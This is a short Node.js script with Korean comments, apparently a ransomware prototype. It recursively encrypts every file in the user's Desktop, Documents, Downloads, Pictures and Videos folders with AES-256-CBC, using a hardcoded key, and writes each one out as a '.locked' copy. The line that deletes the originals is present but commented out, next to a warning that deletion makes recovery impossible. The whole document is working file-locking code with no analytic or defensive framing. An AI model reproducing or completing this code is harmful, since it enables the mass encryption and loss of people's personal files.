const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');

const password = '12345';
const salt = 'my-secret-salt'; // 복호화 시에도 동일해야 함
const key = crypto.scryptSync(password, salt, 32);
const algorithm = 'aes-256-cbc';

// 사용자 홈 디렉토리 내 주요 폴더 지정 (바탕화면, 문서, 다운로드, 사진)
const userHome = os.homedir();
const targetPaths = [
    path.join(userHome, 'Desktop'),
    path.join(userHome, 'Documents'),
    path.join(userHome, 'Downloads'),
    path.join(userHome, 'Pictures'),
    path.join(userHome, 'Videos')
];

function encryptFile(filePath) {
    try {
        const stats = fs.lstatSync(filePath);
        if (stats.isDirectory()) {
            const files = fs.readdirSync(filePath);
            files.forEach(file => encryptFile(path.join(filePath, file)));
        } else if (stats.isFile() && !filePath.endsWith('.locked')) {
            const iv = crypto.randomBytes(16);
            const cipher = crypto.createCipheriv(algorithm, key, iv);
            
            const input = fs.readFileSync(filePath);
            const encrypted = Buffer.concat([iv, cipher.update(input), cipher.final()]);
            
            fs.writeFileSync(filePath + '.locked', encrypted);
            // fs.unlinkSync(filePath); // 원본 삭제 시 복구 불가능하니 주의!
            console.log(`암호화 완료: ${filePath}`);
        }
    } catch (err) {
        console.error(`접근 실패: ${filePath}`);
    }
}

// 모든 대상 폴더 실행
targetPaths.forEach(target => {
    if (fs.existsSync(target)) {
        console.log(`탐색 시작: ${target}`);
        encryptFile(target);
    }
});
